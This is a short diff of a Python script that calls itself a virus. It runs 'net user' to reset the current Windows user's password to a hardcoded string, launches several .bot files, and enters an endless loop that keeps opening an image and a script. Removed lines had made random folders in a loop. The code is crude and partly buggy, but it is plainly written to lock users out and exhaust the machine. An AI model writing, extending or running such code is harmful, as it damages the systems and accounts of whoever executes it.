@@ -1,7 +1,5 @@
+#importing
 import os
-
-
-
 
 
 
@@ -10,24 +8,19 @@ user = os.environ['USERNAME']
 code = 'net user' + user + 'yourhacking!!!@#$$##%$ytyt766'#<password
 os.system(code)
 
-
-
-
-
-
-
-
-
+try:
+    os.startfile("CORT.bot")
+    os.startfile("FORMAT.bot")
+    os.startfile("WIN.bot")
+    os.startfile("RESOF.bot")
+except:
+    pass
 
 
 #Virus start
 while True:
-    os.startfile("TEST.png")
-    os.startfile("b.py")
-
-
     try:
-        name = str(random.randrange(1234567890904903756))
-        os.system(f'mkdir {name}')
+        os.startfile("TEST.png")
+        os.startfile("b.py")
     except:
         pass
